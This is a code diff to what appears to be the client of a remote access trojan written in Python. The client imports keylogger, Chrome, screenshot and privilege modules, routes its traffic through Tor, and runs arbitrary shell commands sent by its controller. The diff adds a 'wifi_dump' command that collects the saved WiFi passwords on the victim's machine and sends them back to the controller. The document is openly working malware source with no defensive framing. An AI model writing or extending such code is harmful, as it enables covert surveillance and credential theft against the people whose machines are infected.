@@ -11,7 +11,7 @@ import requests
 import time
 
 # Local tools to the application
-from tools import keylogger, privilege, chrome, peripherals, screenshot
+from tools import keylogger, privilege, chrome, peripherals, screenshot, wifi
 
 #importing tor network
 from tor_network import ClientSocket, Tor
@@ -317,6 +317,24 @@ def shell():
                         reliable_send({'error': f'Unknown keylogger command: {cmd}'})
                 except Exception as e:
                     reliable_send({'error': f'Keylogger error: {str(e)}'})
+            elif command == 'wifi_dump':
+                print("[*] Dumping WiFi passwords...")
+                try:
+                    dumper = wifi.WifiDumper()
+                    success, message = dumper.get_wifi_profiles()
+                    if success:
+                        # Save to file and get JSON data
+                        save_success, save_message = dumper.save_to_file()
+                        wifi_data = dumper.get_json()
+                        reliable_send({
+                            'success': True,
+                            'message': save_message,
+                            'wifi_data': wifi_data
+                        })
+                    else:
+                        reliable_send({'error': message})
+                except Exception as e:
+                    reliable_send({'error': f'WiFi dump error: {str(e)}'})
             else:
                 print(f"[*] Executing: {command}")
                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
